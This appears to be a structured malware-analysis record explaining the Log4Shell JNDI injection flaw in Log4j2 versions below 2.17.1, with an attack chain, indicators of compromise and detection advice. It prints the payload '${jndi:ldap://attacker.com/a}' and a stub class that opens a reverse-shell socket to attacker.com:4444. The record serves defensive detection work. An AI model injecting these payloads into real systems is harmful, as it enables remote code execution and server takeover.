package_info.why_malicious: Vulnerable versions of the Log4j2 library (<2.17.1) allow attackers to inject specially crafted JNDI lookup strings into log messages. When these messages are processed, Log4j2 can perform network lookups and load attacker-controlled Java classes from remote servers, resulting in arbitrary code execution. This behavior is unintended and exposes applications to severe remote code execution risks when handling untrusted input.

execution_context.file_location: application code using Log4j2 (e.g., login handler)

malicious_snippets.code_snippet: logger.error(username); // where username is user-controlled input, e.g., ${jndi:ldap://attacker.com/a}
malicious_snippets.code_behavior: At runtime, when user input is logged, the code passes a user-controlled string to Log4j2, which interprets the string as an interpolated expression. If the string contains a JNDI lookup (e.g., ${jndi:ldap://attacker.com/a}), Log4j2 initiates a network request to the specified LDAP server, retrieves a reference to a remote Java class, and loads it, resulting in remote code execution.

malice_analysis.why_suspicious: Passing untrusted user input directly to the logger enables attackers to inject JNDI expressions, which can trigger network lookups and remote class loading, leading to arbitrary code execution.
malice_analysis.violated_expectations: Logging frameworks are expected to treat log message content as inert data, not as executable expressions or triggers for network activity.
malice_analysis.similar_legitimate_use: JNDI lookups may be used for resource resolution in trusted, static configurations, but never with untrusted or user-supplied input.
key_indicators: Presence of JNDI interpolation patterns in log messages
Network requests initiated by log message content
Dynamic class loading based on log data

malicious_snippets.code_snippet: Object obj = context.lookup(jndiName); // jndiName is attacker-controlled, e.g., ldap://attacker.com/a
malicious_snippets.code_behavior: At runtime, when a JNDI lookup is triggered by an interpolated log message, the Log4j2 JndiManager performs a network request to the attacker-controlled LDAP server, retrieves a reference to a remote Java class, and deserializes or loads it, resulting in execution of attacker-supplied code.

malice_analysis.why_suspicious: Performing JNDI lookups on attacker-controlled URLs allows attackers to supply arbitrary Java classes, enabling remote code execution.
malice_analysis.violated_expectations: JNDI lookups should only be performed on trusted, static endpoints, not on values derived from untrusted input or log data.
malice_analysis.similar_legitimate_use: JNDI is used for resource lookups in enterprise Java applications, but only with trusted, pre-configured endpoints.
key_indicators: Outbound LDAP or RMI requests initiated by log processing
Dynamic loading or deserialization of remote Java classes

malicious_snippets.code_snippet: public class Exploit { static { new Socket("attacker.com", 4444); /* ... command loop ... */ } }
malicious_snippets.code_behavior: At runtime, after the malicious class is loaded via JNDI, the static initializer of the class opens a socket to the attacker's server, establishes a reverse shell, and enters a command loop, allowing the attacker to execute arbitrary commands on the victim server.

malice_analysis.why_suspicious: Loading and executing code from an untrusted remote server that opens a reverse shell is a clear example of remote code execution and system compromise.
malice_analysis.violated_expectations: Application code should never load or execute classes from untrusted sources, nor should it establish outbound reverse shells to external servers.
malice_analysis.similar_legitimate_use: Reverse shells may be used in controlled penetration testing, but are never present in legitimate production code.
key_indicators: Static initializer that initiates outbound network connections
Reverse shell logic embedded in loaded class
Outbound connections to attacker-controlled hosts and ports

attack_chain.action: Attacker injects a malicious JNDI string (e.g., ${jndi:ldap://attacker.com/a}) into a user input field that is logged by the application.
attack_chain.leads_to: Log4j2 processes the log message and triggers a JNDI lookup.

attack_chain.action: Log4j2 performs a JNDI lookup to the attacker-controlled LDAP server, as specified in the log message.
attack_chain.leads_to: LDAP server responds with a reference to a remote Java class hosted on the attacker's HTTP server.

attack_chain.action: The application loads and executes the attacker-supplied Java class, which opens a reverse shell to the attacker's server.
attack_chain.leads_to: Attacker gains remote code execution on the victim server.

behavioral_signatures: Log message content containing JNDI lookup patterns (e.g., ${jndi:ldap://...})
Unexpected outbound LDAP or RMI network requests from Java applications following log events
Dynamic loading of remote Java classes via JNDI lookups
Creation of reverse shells or unexpected outbound socket connections from Java processes
file_indicators: Presence of log4j-core versions <2.17.1 in pom.xml or dependency tree
Application code that logs user input directly without sanitization
Unusual or unexpected Java class files loaded at runtime from remote sources
network_indicators: Outbound LDAP or RMI requests to external IPs or domains not present in normal application operation
Subsequent HTTP requests to attacker-controlled servers for Java class files after LDAP/RMI lookups
Outbound connections to non-standard ports (e.g., 4444) indicating reverse shell activity
detection_knowledge.how_to_detect: Monitor application logs and network traffic for JNDI lookup patterns in log messages (e.g., ${jndi:ldap://...}). Detect unexpected outbound LDAP, RMI, or HTTP requests from Java applications, especially those that coincide with log events containing user input. Scan dependency manifests (e.g., pom.xml) for vulnerable log4j-core versions. Use runtime instrumentation or endpoint detection and response (EDR) tools to detect dynamic class loading from remote sources and the creation of reverse shells or suspicious outbound sockets.
